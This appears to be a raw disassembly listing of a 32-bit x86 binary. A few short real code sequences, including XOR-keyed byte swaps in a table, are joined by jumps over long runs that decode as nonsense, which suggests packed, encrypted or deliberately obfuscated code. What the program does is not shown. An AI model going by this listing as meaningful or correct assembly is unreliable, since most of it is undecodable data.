  40c8d1:	mov    edi,DWORD PTR [ebp-0x1c]
  40c8d4:	mov    dl,BYTE PTR [edx+edi*1+0x32729a]
  40c8db:	mov    BYTE PTR [ebp+0xb],dl
  40c8de:	mov    dl,BYTE PTR [ebp+0xf]
  40c8e1:	mov    edi,DWORD PTR [ebp-0xc]
  40c8e4:	xor    edi,eax
  40c8e6:	add    edi,DWORD PTR [ebp-0x14]
  40c8e9:	mov    ebx,DWORD PTR [ebp-0x1c]
  40c8ec:	mov    BYTE PTR [edi+ebx*1+0x32729a],dl
  40c8f3:	mov    dl,BYTE PTR [ebp+0xb]
  40c8f6:	mov    edi,DWORD PTR [ebp-0x18]
  40c8f9:	xor    edi,eax
  40c8fb:	add    edi,DWORD PTR [ebp-0x14]
  40c8fe:	mov    ebx,DWORD PTR [ebp-0x1c]
  40c901:	mov    BYTE PTR [edi+ebx*1+0x32729a],dl
  40c908:	mov    edx,DWORD PTR [ebp-0x44]
  40c90b:	mov    edi,DWORD PTR [ebp-0xc]
  40c90e:	xor    edx,eax
  40c910:	xor    edi,eax
  40c912:	jmp    0x40cc85
  40c917:	dec    si
  40c919:	(bad)  
  40c91a:	mov    dh,0xf7
  40c91c:	mov    cl,0x71
  40c91e:	dec    esi
  40c91f:	imul   esp,DWORD PTR [eax+0x63],0xffffff8e
  40c923:	repz std 
  40c925:	in     eax,0x39
  40c927:	ins    DWORD PTR es:[edi],dx
  40c928:	xchg   esi,eax
  40c929:	jl     0x40c9a7
  40c92b:	retf   0x7c79
  40c92e:	jl     0x40c927
  40c930:	or     dh,BYTE PTR [edi]
  40c932:	mov    ebx,0xeeb05f62
  40c937:	mov    ds:0x3fa8595,eax
  40c93c:	pop    edi
  40c93d:	pop    ss
  40c93e:	or     eax,0xf0a32d6a
  40c943:	sbb    dh,BYTE PTR [ebx-0x12]
  40c946:	xor    al,0x72
  40c948:	lods   eax,DWORD PTR ds:[esi]
  40c949:	je     0x40c987
  40c94b:	inc    esi
  40c94c:	fadd   QWORD PTR [ebx+0x56aaf0f0]
  40c952:	push   0xffffffd8
  40c954:	mov    dh,0x45
  40c956:	rcl    DWORD PTR [esi+0x5e],1
  40c959:	sub    al,0xf1
  40c95b:	and    al,0xf1
  40c95d:	jbe    0x40c951
  40c95f:	xor    esi,eax
  40c961:	ins    DWORD PTR es:[edi],dx
  40c962:	dec    ecx
  40c963:	push   edx
  40c964:	mov    ch,0x5a
  40c966:	xchg   DWORD PTR [eax],esi
  40c968:	das    
  40c969:	xor    eax,0xc41768ff
  40c96e:	mov    ds:0x2f5a1a0,eax
  40c973:	xchg   BYTE PTR [edi-0x2c0c00c],cl
  40c979:	cs pop ebp
  40c97b:	fdiv   st(0),st
  40c97d:	ja     0x40c931
  40c97f:	sbb    ebx,ebp
  40c981:	dec    ebx
  40c982:	dec    eax
  40c983:	jmp    0x40c91a
  40c985:	jge    0x40c95a
  40c987:	xor    eax,0x97da639f
  40c98c:	xor    al,0xd4
  40c98e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c98f:	add    al,0x49
  40c991:	sahf   
  40c992:	add    ch,al
  40c994:	and    al,0x98
  40c996:	mov    bl,0xaf
  40c998:	fcomp  st(6)
  40c99a:	push   edx
  40c99b:	push   DWORD PTR [eax]
  40c99d:	adc    DWORD PTR [esi],0xe9196716
  40c9a3:	out    0x9a,al
  40c9a5:	jno    0x40c9b4
  40c9a7:	pop    ss
  40c9a8:	lahf   
  40c9a9:	mov    cl,0xb
  40c9ab:	mov    DWORD PTR [edx],ebx
  40c9ad:	mov    al,0x22
  40c9af:	shl    BYTE PTR [edx+0xa627237],1
  40c9b5:	mov    edx,0xce43c941
  40c9ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c9bb:	mov    WORD PTR [ebp+0x26f0242a],es
  40c9c1:	jg     0x40ca2a
  40c9c3:	and    bl,ch
  40c9c5:	scas   al,BYTE PTR es:[edi]
  40c9c6:	out    0x9d,eax
  40c9c8:	mov    bl,0x3a
  40c9ca:	fisttp QWORD PTR [esi]
  40c9cc:	mov    cl,0xd8
  40c9ce:	mov    DWORD PTR [esi],edx
  40c9d0:	mov    BYTE PTR [edx],bl
  40c9d2:	adc    esi,DWORD PTR [ebx+ebp*2-0x7a]
  40c9d6:	add    al,0x62
  40c9d8:	pop    ebx
  40c9d9:	mov    ch,0x9f
  40c9db:	jmp    0x40ca2f
  40c9dd:	ror    BYTE PTR [esi+0x206d7684],0xb2
  40c9e4:	mov    cl,0xcf
  40c9e6:	jbe    0x40c997
  40c9e8:	repz mov al,ds:0x76b204ac
  40c9ee:	sbb    DWORD PTR [esi-0x15ed4c8c],ebp
  40c9f4:	shl    BYTE PTR [ebx+ebx*4+0x69],1
  40c9f8:	xchg   ebx,eax
  40c9f9:	pop    ecx
  40c9fa:	push   0x665b3c8a
  40c9ff:	sbb    ecx,DWORD PTR [esp+edi*8]
  40ca02:	adc    bh,BYTE PTR [ebp-0x77]
  40ca05:	push   edi
  40ca06:	xor    al,0x9f
  40ca08:	leave  
  40ca09:	shl    BYTE PTR [edx*2-0x7b954e93],0x49
  40ca11:	in     eax,0x75
  40ca13:	mov    dh,0x5a
  40ca15:	xor    ebx,edx
  40ca17:	adc    eax,0x176d0bb5
  40ca1c:	push   esp
  40ca1d:	inc    esi
  40ca1e:	aad    0x8
  40ca20:	pop    ss
  40ca21:	idiv   DWORD PTR [esi-0x26221169]
  40ca27:	jmp    0xbeb6679c
  40ca2c:	sti    
  40ca2d:	fincstp 
  40ca2f:	popa   
  40ca30:	jecxz  0x40ca36
  40ca32:	iret   
  40ca33:	and    BYTE PTR ds:0xb3ab26c5,0x8d
  40ca3a:	loop   0x40ca3b
  40ca3c:	sub    al,0xff
  40ca3e:	loop   0x40ca64
  40ca40:	and    edi,ebp
  40ca42:	jmp    0xa5f21898
  40ca47:	arpl   WORD PTR [ecx-0x5d],ax
  40ca4a:	js     0x40c9ce
  40ca4c:	jge    0x40ca2b
  40ca4e:	xchg   edx,eax
  40ca4f:	xchg   ecx,eax
  40ca50:	and    ch,BYTE PTR [ebx-0x43]
  40ca53:	sbb    BYTE PTR [ebp+0x5f],ah
  40ca56:	inc    ebx
  40ca57:	dec    DWORD PTR [edi]
  40ca59:	xor    BYTE PTR [ebx],0x9f
  40ca5c:	or     edx,DWORD PTR [ebx-0x1a87acf3]
  40ca62:	icebp  
  40ca63:	mov    edi,DWORD PTR ds:0xbf8e4389
  40ca69:	cmp    eax,0xa3c44067
  40ca6e:	sbb    al,0xc
  40ca70:	xchg   edx,eax
  40ca71:	clc    
  40ca72:	in     al,dx
  40ca73:	adc    al,BYTE PTR [esi]
  40ca75:	clc    
  40ca76:	cmp    BYTE PTR [eax],0x2
  40ca79:	inc    esi
  40ca7a:	in     al,dx
  40ca7b:	fld    DWORD PTR [edx-0x7aff7fa2]
  40ca81:	mov    al,ds:0x86f3d186
  40ca86:	push   es
  40ca87:	mov    ecx,0x8a969f89
  40ca8c:	xchg   BYTE PTR [ebp+0x755f3490],ch
  40ca92:	or     BYTE PTR ds:0xac2b6932,bh
  40ca98:	(bad)  
  40ca99:	mov    ebp,0x9ad84a91
  40ca9e:	lahf   
  40ca9f:	add    al,dh
  40caa1:	repnz inc eax
  40caa3:	lods   eax,DWORD PTR ds:[esi]
  40caa4:	rcl    DWORD PTR [ebp-0x71],0xf7
  40caa8:	(bad)  [edi-0x80]
  40caab:	mov    ds:0xee477363,al
  40cab0:	stos   DWORD PTR es:[edi],eax
  40cab1:	push   edi
  40cab2:	and    esi,ecx
  40cab4:	popa   
  40cab5:	(bad)  
  40cab6:	ja     0x40cb04
  40cab8:	maskmovq mm5,(bad)
  40cab9:	imul   DWORD PTR [ecx]
  40cabb:	bound  eax,QWORD PTR [edx+esi*1]
  40cabe:	mov    ch,0xfe
  40cac0:	cmc    
  40cac1:	dec    ecx
  40cac2:	jge    0x40cade
  40cac4:	les    edx,FWORD PTR [esi-0x5c]
  40cac7:	jecxz  0x40cb39
  40cac9:	mov    bh,0xd5
  40cacb:	fst    QWORD PTR [ecx+esi*2+0x38e68e88]
  40cad2:	xchg   esp,eax
  40cad3:	sbb    ebp,eax
  40cad5:	and    eax,0xc86be905
  40cada:	pop    esp
  40cadb:	mov    ecx,0xe94c6bb1
  40cae0:	jmp    0xe5e8:0xa7675531
  40cae7:	mov    ebx,0xc422b9f6
  40caec:	sti    
  40caed:	call   0x95f908d1
  40caf2:	es jle 0x40caae
  40caf5:	(bad)  
  40caf6:	je     0x40cace
  40caf8:	jbe    0x40cab0
  40cafa:	popf   
  40cafb:	mov    ebp,0x7b6ab4ff
  40cb00:	cmp    BYTE PTR [ebp+0x55],dh
  40cb03:	cmp    esi,ebx
  40cb05:	xor    BYTE PTR [edi],0x34
  40cb08:	cmp    DWORD PTR es:[esi],ebp
  40cb0b:	or     eax,0x645803f2
  40cb10:	xor    al,0xd3
  40cb12:	xor    al,0x57
  40cb14:	mov    BYTE PTR [ebx-0x33],bl
  40cb17:	inc    edi
  40cb18:	call   0xbd05059c
  40cb1d:	pop    ecx
  40cb1e:	pop    ebp
  40cb1f:	xchg   esp,eax
  40cb20:	jecxz  0x40cb80
  40cb22:	outs   dx,BYTE PTR ds:[esi]
  40cb23:	popf   
  40cb24:	dec    ebp
  40cb25:	es loope 0x40cb42
  40cb28:	add    eax,0xa9e6e5ed
  40cb2d:	cld    
  40cb2e:	or     BYTE PTR [esi+0x4c],cl
  40cb31:	jg     0x40cb54
  40cb33:	enter  0x7131,0x19
  40cb37:	pop    esp
  40cb38:	or     DWORD PTR [edi+0x7c],0xd50828ae
  40cb3f:	push   es
  40cb40:	mov    al,ds:0x37c79af9
  40cb45:	mov    al,0x9a
  40cb47:	adc    ecx,ecx
  40cb49:	fsubr  st,st(7)
  40cb4b:	fnstcw WORD PTR [ebx+eiz*2-0x5af0eefa]
  40cb52:	scas   eax,DWORD PTR es:[edi]
  40cb53:	xchg   BYTE PTR [ebp+0x1e],ah
  40cb56:	scas   al,BYTE PTR es:[edi]
  40cb57:	ss cli 
  40cb59:	neg    cl
  40cb5b:	mov    esp,0xddcca01
  40cb60:	loopne 0x40cb1d
  40cb62:	imul   ecx,DWORD PTR [ebp+0x11],0x29
  40cb66:	inc    edx
  40cb67:	push   0x59fc652d
  40cb6c:	ret    
  40cb6d:	pusha  
  40cb6e:	add    DWORD PTR [eax],esp
  40cb70:	mov    ah,0x2
  40cb72:	pop    eax
  40cb73:	pop    ds
  40cb74:	stos   DWORD PTR es:[edi],eax
  40cb75:	jle    0x40cb6c
  40cb77:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cb78:	dec    ecx
  40cb79:	pop    edi
  40cb7a:	or     dl,BYTE PTR [esi+edi*4]
  40cb7d:	adc    al,0x59
  40cb7f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cb80:	and    BYTE PTR [ebx-0x14],bl
  40cb83:	jecxz  0x40cb2f
  40cb85:	mov    bl,dh
  40cb87:	xchg   ecx,eax
  40cb88:	cmp    dh,BYTE PTR [ecx-0x6]
  40cb8b:	out    dx,eax
  40cb8c:	std    
  40cb8d:	adc    DWORD PTR [edi],0x23cdcad
  40cb93:	inc    esi
  40cb94:	cmp    eax,edx
  40cb96:	jae    0x40cba6
  40cb98:	bound  ecx,QWORD PTR [esi-0x1b]
  40cb9b:	arpl   WORD PTR [esi-0x35],bp
  40cb9e:	dec    edi
  40cb9f:	xor    ah,ah
  40cba1:	jp     0x40cb51
  40cba3:	jno    0x40cbd2
  40cba5:	(bad)  
  40cba6:	mov    ds:0xcf483719,al
  40cbab:	adc    DWORD PTR [ebx+ebx*2],esi
  40cbae:	(bad)  
  40cbb0:	xchg   ebp,eax
  40cbb1:	test   esp,ebp
  40cbb3:	push   ss
  40cbb4:	mov    WORD PTR [esi+0xa],fs
  40cbb7:	(bad)  
  40cbb8:	fimul  WORD PTR [ecx]
  40cbba:	div    BYTE PTR [edx-0x4d]
  40cbbd:	mov    ah,0xf1
  40cbbf:	clc    
  40cbc0:	add    BYTE PTR [edx+0x59],bh
  40cbc3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cbc4:	add    al,0x85
  40cbc6:	das    
  40cbc7:	adc    DWORD PTR [edx],edx
  40cbc9:	mov    ds:0xe9bb8e5c,eax
  40cbce:	push   edi
  40cbcf:	adc    esp,0xffffff91
  40cbd2:	scas   al,BYTE PTR es:[edi]
  40cbd3:	xchg   esp,eax
  40cbd4:	or     eax,esi
  40cbd6:	imul   esp,DWORD PTR [eax+0x66afb019],0x36
  40cbdd:	xlat   BYTE PTR ds:[ebx]
  40cbde:	ja     0x40cbb3
  40cbe0:	bound  ebx,QWORD PTR [ebx-0x45]
  40cbe3:	mov    al,0x9b
  40cbe5:	push   ds
  40cbe6:	pusha  
  40cbe7:	xchg   ecx,eax
  40cbe8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cbe9:	and    eax,edx
  40cbeb:	popa   
  40cbec:	jmp    0x40cb8f
  40cbee:	stos   BYTE PTR es:[edi],al
  40cbef:	mov    dh,0x2e
  40cbf1:	jo     0x40cb97
  40cbf3:	inc    esi
  40cbf4:	jnp    0x40cc5a
  40cbf6:	push   ss
  40cbf7:	inc    edx
  40cbf8:	jno    0x40cc03
  40cbfa:	stos   BYTE PTR es:[edi],al
  40cbfb:	test   al,0x77
  40cbfd:	sbb    eax,0x820be81e
  40cc02:	lock cs je 0x40cbd3
  40cc06:	push   eax
  40cc07:	outs   dx,DWORD PTR ds:[esi]
  40cc08:	or     BYTE PTR [edx],dl
  40cc0a:	mov    al,0xac
  40cc0c:	xchg   edi,eax
  40cc0e:	cmc    
  40cc0f:	repz push ebx
  40cc11:	adc    ebx,DWORD PTR [edi+0x78]
  40cc14:	xor    bl,dh
  40cc16:	inc    ebp
  40cc17:	ins    DWORD PTR es:[edi],dx
  40cc18:	popa   
  40cc19:	mov    es,WORD PTR [esi+0x582ccddc]
  40cc1f:	loope  0x40cbdb
  40cc21:	iret   
  40cc22:	mov    gs,WORD PTR ds:0x86be137e
  40cc28:	add    DWORD PTR [edx-0x50],eax
  40cc2b:	repnz icebp 
  40cc2d:	fcmove st,st(5)
  40cc2f:	mov    WORD PTR [ebx],es
  40cc31:	mov    ah,0xca
  40cc33:	pusha  
  40cc34:	push   0xffffffcd
  40cc36:	in     al,0xa3
  40cc38:	sti    
  40cc39:	retf   0xd1c4
  40cc3c:	mov    ebp,0xd515a529
  40cc41:	dec    eax
  40cc42:	retf   
  40cc43:	shl    DWORD PTR [edx-0x77dc094e],1
  40cc49:	outs   dx,DWORD PTR ds:[esi]
  40cc4a:	pusha  
  40cc4b:	scas   eax,DWORD PTR es:[di]
  40cc4d:	outs   dx,DWORD PTR ds:[esi]
  40cc4e:	pop    esi
  40cc4f:	push   ss
  40cc50:	dec    edi
  40cc51:	loope  0x40cc4e
  40cc53:	fiadd  DWORD PTR ds:0xc96306e2
  40cc59:	scas   al,BYTE PTR es:[edi]
  40cc5a:	jb     0x40ccd2
  40cc5c:	fadd   QWORD PTR [ecx]
  40cc5e:	jecxz  0x40cc29
  40cc60:	mov    cl,0x55
  40cc62:	add    DWORD PTR [ecx+0x559ead36],eax
  40cc68:	mov    ebx,0xd921529
  40cc6d:	push   esp
  40cc6e:	pop    esp
  40cc6f:	jmp    0x43656caa
  40cc74:	fcomp  QWORD PTR [ebx+0xc]
  40cc77:	push   es
  40cc78:	mov    eax,ds:0xfcf0f9e1
  40cc7d:	les    ebx,FWORD PTR [edi-0x6723b738]
  40cc83:	add    al,0x84
  40cc85:	add    edx,ecx
  40cc87:	add    edi,ecx
  40cc89:	imul   edx,edi
  40cc8c:	add    edx,DWORD PTR [ebp-0x14]
  40cc8f:	mov    DWORD PTR [ebp-0x14],edx
  40cc92:	mov    edx,DWORD PTR [ebp-0xc]
  40cc95:	jmp    0x40d008
  40cc9a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cc9b:	loopne 0x40cc38
  40cc9d:	mov    ebx,0xe364435b
  40cca2:	mov    ecx,DWORD PTR [esi]
  40cca4:	pop    eax
  40cca5:	push   es
  40cca6:	ins    DWORD PTR es:[edi],dx
  40cca7:	shufps xmm7,xmm2,0x3b
  40ccab:	xchg   edx,eax
  40ccac:	jl     0x40cd2a
  40ccae:	retf   0x7c79
  40ccb1:	jl     0x40cc56
  40ccb3:	data16 fwait
  40ccb5:	cmc    
  40ccb6:	iret   
  40ccb7:	push   esp
  40ccb8:	addr16 dec ecx
  40ccba:	daa    
  40ccbb:	test   dh,al
  40ccbd:	outs   dx,BYTE PTR ds:[esi]
  40ccbe:	and    edi,DWORD PTR [edi+edx*4]
  40ccc1:	inc    edi
  40ccc2:	sbb    al,0x18
  40ccc4:	adc    eax,0x2e7e58f4
  40ccc9:	test   DWORD PTR [esi],esi
  40cccb:	push   ebx
  40cccc:	fbld   TBYTE PTR [ebp+0x337440c6]
  40ccd2:	ss retf 
  40ccd4:	pusha  
  40ccd5:	add    DWORD PTR [eax+0x39],ecx
  40ccd8:	push   edx
  40ccd9:	cld    
  40ccda:	aam    0x65
  40ccdc:	std    
  40ccdd:	sub    eax,esp
  40ccdf:	jns    0x40cd37
  40cce1:	jmp    0xcf00:0x88a3cfbf
  40cce8:	mov    esp,0x3d767353
  40cced:	popa   
  40ccee:	jns    0x40ccc8
  40ccf0:	arpl   WORD PTR ds:0xf17673b5,di
  40ccf6:	pop    esi
  40ccf7:	out    dx,al
  40ccf8:	xor    dh,0x48
  40ccfb:	push   cs
  40ccfc:	mov    esi,0xc8d4f804
  40cd01:	(bad)  
  40cd02:	aad    0x5d
  40cd04:	int3   
  40cd05:	push   ss
  40cd06:	or     al,0xfe
  40cd08:	shr    DWORD PTR [eax],cl
  40cd0a:	ds dec ebx
  40cd0c:	aam    0xfb
  40cd0e:	idiv   BYTE PTR [esi+edi*8+0x7a605be]
  40cd15:	push   cs
  40cd16:	pop    ds
  40cd17:	mov    al,0xb1
  40cd19:	std    
  40cd1a:	leave  
  40cd1b:	cmp    DWORD PTR [edi-0x1f655dd],0xd9c8006b
  40cd25:	pusha  
  40cd26:	inc    edx
  40cd27:	adc    al,0x4e
  40cd29:	std    
  40cd2a:	arpl   sp,bx
  40cd2c:	adc    al,0x32
  40cd2e:	sub    DWORD PTR [edi],esi
  40cd30:	xchg   edx,eax
  40cd31:	loopne 0x40cdb1
  40cd33:	arpl   ax,sp
  40cd35:	jecxz  0x40cd21
  40cd37:	inc    edx
  40cd38:	push   esi
  40cd39:	mov    eax,DWORD PTR [ecx-0x3f]
  40cd3c:	mov    esp,0xf257e693
  40cd41:	xchg   ecx,eax
  40cd42:	lods   al,BYTE PTR ds:[esi]
  40cd43:	out    0x9e,al
  40cd45:	pop    ecx
  40cd46:	leave  
  40cd47:	in     al,0x7d
  40cd49:	cld    
  40cd4a:	inc    edi
  40cd4b:	sbb    dh,dh
  40cd4d:	push   0xa49f6323
  40cd52:	(bad)  [edi]
  40cd54:	shl    DWORD PTR [edx-0x2c8477e3],cl
  40cd5a:	xchg   esp,eax
  40cd5b:	stos   BYTE PTR es:[di],al
  40cd5d:	sub    ch,dl
  40cd5f:	jo     0x40cdb6
  40cd61:	inc    ebp
  40cd62:	sub    DWORD PTR [ecx],0x70
  40cd65:	(bad)  
  40cd66:	rcl    BYTE PTR [ebp+0x44],0x1
  40cd6a:	pop    eax
  40cd6b:	cmp    eax,0x7f5a99f2
  40cd70:	push   esi
  40cd71:	push   ecx
  40cd72:	and    al,0x7c
  40cd74:	inc    eax
  40cd75:	in     al,0xdd
  40cd77:	mov    edi,0x237b807a
  40cd7c:	in     eax,dx
  40cd7d:	imul   BYTE PTR [edx+esi*4+0x7e]
  40cd81:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cd82:	add    al,0x18
  40cd84:	mov    esi,0x6fba541d
  40cd89:	pop    edi
  40cd8a:	cmp    esp,DWORD PTR [edx-0x5d34f22e]
  40cd90:	ficom  DWORD PTR [eax+0x36]
  40cd93:	js     0x40cdc5
  40cd95:	push   es
  40cd96:	mov    bl,0x50
  40cd98:	sbb    DWORD PTR [ebx+eiz*8-0x2c],eax
  40cd9c:	cmp    eax,esi
  40cd9e:	jmp    0x40cdb8
  40cda0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cda1:	(bad)  
  40cda2:	in     eax,0x60
  40cda4:	jp     0x40ce05
  40cda6:	push   0x54
  40cda8:	(bad)  
  40cda9:	sub    dh,bl
  40cdab:	test   BYTE PTR [esi-0x37],cl
  40cdae:	add    al,0x1a
  40cdb0:	in     eax,0xac
  40cdb2:	fnstsw WORD PTR ds:0xbec13bbf
  40cdb8:	mov    ds:0x203151f4,eax
  40cdbd:	daa    
  40cdbe:	stos   BYTE PTR es:[edi],al
  40cdbf:	(bad)  
  40cdc0:	bnd jge 0x40ce38
  40cdc3:	ret    0x62
  40cdc6:	push   ecx
  40cdc7:	inc    esp
  40cdc8:	pop    ecx
  40cdc9:	lods   eax,DWORD PTR ds:[esi]
  40cdca:	mov    ebp,0x5aa70c65
  40cdcf:	or     al,0xc
  40cdd1:	cdq    
  40cdd2:	jle    0x40cd85
  40cdd4:	jo     0x40ce25
  40cdd6:	fmul   DWORD PTR ss:[ebp+0x57]
  40cdda:	ss ret 0xd492
  40cdde:	xchg   edx,eax
  40cddf:	or     DWORD PTR [ebx-0x318fa532],eax
  40cde5:	push   ebp
  40cde6:	ins    BYTE PTR es:[edi],dx
  40cde7:	repnz mov dl,cl
  40cdea:	sub    dl,BYTE PTR [esi]
  40cdec:	clc    
  40cded:	fdiv   QWORD PTR [esi]
  40cdef:	sar    DWORD PTR [eax+0x47db8d45],1
  40cdf5:	mov    ds:0xdc556ee1,al
  40cdfa:	add    ebx,ecx
  40cdfc:	mov    ds:0xd9b50279,al
  40ce01:	and    al,0x7b
  40ce03:	mov    ds:0xe4cbfc67,eax
  40ce08:	test   al,0x49
  40ce0a:	jnp    0x40ce30
  40ce0c:	outs   dx,DWORD PTR ds:[esi]
  40ce0d:	ret    0xbf8d
  40ce10:	std    
  40ce11:	mov    edx,0x2770ab13
  40ce16:	push   esp
  40ce17:	jmp    0x40ce67
  40ce19:	mov    ds:0x276286b,eax
  40ce1e:	jp     0x40cddd
  40ce20:	jb     0x40cdd2
  40ce22:	add    al,0x8e
  40ce24:	push   ebp
  40ce25:	lds    edx,FWORD PTR [ecx+0x58]
  40ce28:	xor    ecx,DWORD PTR [esi+edi*4+0x6ff51ab0]
  40ce2f:	imul   edi,DWORD PTR [esi+ecx*1-0x12],0x68bbec63
  40ce37:	pop    esi
  40ce38:	jle    0x40ce73
  40ce3a:	repz in eax,dx
  40ce3c:	rol    DWORD PTR [ebx-0x38],0xe1
  40ce40:	(bad)  
  40ce41:	int3   
  40ce42:	mov    eax,ds:0x3f378295
  40ce47:	div    BYTE PTR [ebx-0x3f]
  40ce4a:	xchg   esp,eax
  40ce4b:	loopne 0x40cdd5
  40ce4d:	outs   dx,DWORD PTR ds:[esi]
  40ce4e:	inc    esi
  40ce4f:	sub    al,0xef
  40ce51:	add    BYTE PTR [eax-0xf],bh
  40ce54:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ce55:	repz inc esi
  40ce57:	out    0xf2,al
  40ce59:	aas    
  40ce5a:	dec    esp
  40ce5b:	mov    bh,0x38
  40ce5d:	ins    DWORD PTR es:[edi],dx
  40ce5e:	mov    bh,0xbb
  40ce60:	loope  0x40ce5f
  40ce62:	inc    esi
  40ce63:	jnp    0x40ceb8
  40ce65:	dec    ecx
  40ce66:	dec    esp
  40ce67:	mov    eax,0x4e4fc01e
  40ce6c:	mov    ebp,0x8aed1f58
  40ce71:	retf   
  40ce72:	pop    es
  40ce73:	pop    ecx
  40ce74:	and    DWORD PTR [ebx],esp
  40ce76:	pop    edi
  40ce77:	arpl   WORD PTR [edx],dx
  40ce79:	xor    BYTE PTR [ebx-0x45ce7839],0x1d
  40ce80:	adc    edx,edx
  40ce82:	fisubr WORD PTR [eax-0x40454751]
  40ce88:	in     eax,dx
  40ce89:	repnz sub ecx,DWORD PTR [edi]
  40ce8c:	adc    BYTE PTR [esp+edx*1-0x51],dh
  40ce90:	pop    ecx
  40ce91:	push   esp
  40ce92:	loope  0x40cf07
  40ce94:	sbb    BYTE PTR [esi+0x6b1fdeb4],cl
  40ce9a:	jmp    0xd6ff:0x4a6db954
  40cea1:	pusha  
  40cea2:	jg     0x40ced8
  40cea4:	adc    BYTE PTR [ebx+0x52808d02],0x34
  40ceab:	jnp    0x40cf0d
  40cead:	and    eax,0xa89558ae
  40ceb2:	mov    eax,0xa5131eb6
  40ceb7:	xor    bl,BYTE PTR [edx]
  40ceb9:	pop    edi
  40ceba:	push   0x3f
  40cebc:	pusha  
  40cebd:	jg     0x40ce6d
  40cebf:	test   ecx,ecx
  40cec1:	lods   al,BYTE PTR ds:[esi]
  40cec2:	pop    ss
  40cec3:	or     al,0x3f
  40cec5:	std    
  40cec6:	push   esi
  40cec7:	sub    esp,edx
  40cec9:	fcmovnbe st,st(4)
  40cecb:	nop
  40cecc:	sbb    DWORD PTR [esi-0x20],ecx
  40cecf:	mov    bh,0x7
  40ced1:	leave  
  40ced2:	mov    BYTE PTR [ecx-0x61],dl
  40ced5:	fidivr DWORD PTR [ebx]
  40ced7:	(bad)  
  40ced8:	push   0xe
  40ceda:	and    BYTE PTR [eax-0x2c],bl
  40cedd:	sbb    edi,DWORD PTR [ecx+0x39c6c131]
  40cee3:	test   al,0xb6
  40cee5:	das    
  40cee6:	add    DWORD PTR [edx-0x2c3dd183],eax
  40ceec:	retf   0xb508
  40ceef:	add    eax,0xf8b9444f
  40cef4:	xlat   BYTE PTR ds:[ebx]
  40cef5:	jns    0x40cf2a
  40cef7:	test   eax,0x70fa22c3
  40cefc:	and    BYTE PTR [edi-0x5fe8c8f],cl
  40cf02:	and    BYTE PTR [edx],cl
  40cf04:	mov    ss,WORD PTR [esi]
  40cf06:	push   esi
  40cf07:	out    0x9a,al
  40cf09:	shr    DWORD PTR ds:0xedfb5323,cl
  40cf0f:	pop    ebp
  40cf10:	fnstenv [edi]
  40cf12:	das    
  40cf13:	mov    dh,0x40
  40cf15:	xor    BYTE PTR [edi-0xa],dh
  40cf18:	xchg   edx,eax
  40cf19:	pop    edi
  40cf1a:	lea    edx,[ecx-0x8eada1a]
  40cf20:	fsubr  st,st(1)
  40cf22:	and    eax,0x8cc49213
  40cf27:	mov    al,0x1a
  40cf29:	(bad)  
  40cf2a:	adc    bl,ch
  40cf2c:	int3   
  40cf2d:	jp     0x40cfa5
  40cf2f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cf30:	es inc ebx
  40cf32:	retf   
  40cf33:	cld    
  40cf34:	jae    0x40ceb6
  40cf36:	or     bl,cl
  40cf38:	dec    esi
  40cf39:	addr16 xor al,0x3b
  40cf3c:	mov    ah,bl
  40cf3e:	adc    DWORD PTR [eax+edx*1+0x647ad048],ebp
  40cf45:	adc    ah,ch
  40cf47:	fnstcw WORD PTR [edx+0x58]
  40cf4a:	cmc    
  40cf4b:	arpl   WORD PTR [ebp-0x40a6a126],di
  40cf51:	push   es
  40cf52:	push   eax
  40cf53:	mov    eax,0x7ddb12e7
  40cf58:	ins    BYTE PTR es:[edi],dx
  40cf59:	test   al,0x21
  40cf5b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cf5c:	enter  0x1e06,0xce
  40cf60:	sub    al,0x6b
  40cf62:	in     al,dx
  40cf63:	popf   
  40cf64:	in     al,dx
  40cf65:	std    
  40cf66:	pop    es
  40cf67:	jl     0x40cf68
  40cf69:	sub    DWORD PTR ds:0xd9ff9137,edi
  40cf6f:	fnsave ds:0x221addc0
  40cf75:	fwait
  40cf76:	cmp    DWORD PTR [eax-0x47],esp
  40cf79:	mov    ecx,0xb25cd6a
  40cf7e:	loop   0x40cf13
  40cf80:	sahf   
  40cf81:	ficom  DWORD PTR [ebp-0x16]
  40cf84:	xor    DWORD PTR [eax-0x1b],eax
  40cf87:	xor    dh,BYTE PTR [esp+ebp*1]
  40cf8a:	retf   0x60ef
  40cf8d:	mov    edx,ebp
  40cf8f:	icebp  
  40cf90:	xchg   BYTE PTR [ebx-0x37ff6622],ah
  40cf96:	arpl   cx,dx
  40cf98:	xchg   ebp,eax
  40cf99:	cli    
  40cf9a:	xchg   esi,eax
  40cf9b:	xchg   esp,eax
  40cf9c:	inc    esi
  40cf9d:	sub    edx,esp
  40cf9f:	sbb    dh,BYTE PTR [esi+ebp*2+0x2ab5851f]
  40cfa6:	call   0xbac5:0xfa448dbf
  40cfad:	mov    BYTE PTR [ebx+0x734559b6],ch
  40cfb3:	sbb    BYTE PTR [edi+0x6b9485eb],ah
  40cfb9:	neg    BYTE PTR [ebx]
  40cfbb:	inc    esi
  40cfbc:	arpl   WORD PTR [eax-0x5d],ax
  40cfbf:	scas   eax,DWORD PTR es:[edi]
  40cfc0:	push   0xffffffc1
  40cfc2:	push   cs
  40cfc3:	mov    ds:0x7f97f746,eax
  40cfc8:	or     DWORD PTR [ecx],esp
  40cfca:	in     al,dx
  40cfcb:	add    esp,DWORD PTR [esp+ebp*2-0x7a185aa7]
  40cfd2:	mov    al,ds:0x1d9dd79b
  40cfd7:	in     eax,dx
  40cfd8:	xlat   BYTE PTR gs:[ebx]
  40cfda:	mov    esp,0xfb2ccd41
  40cfdf:	mov    ds:0x76a72c91,al
  40cfe4:	push   ecx
  40cfe5:	inc    esp
  40cfe6:	inc    eax
  40cfe7:	out    0x2f,al
  40cfe9:	aaa    
  40cfea:	jns    0x40d013
  40cfec:	pop    ebp
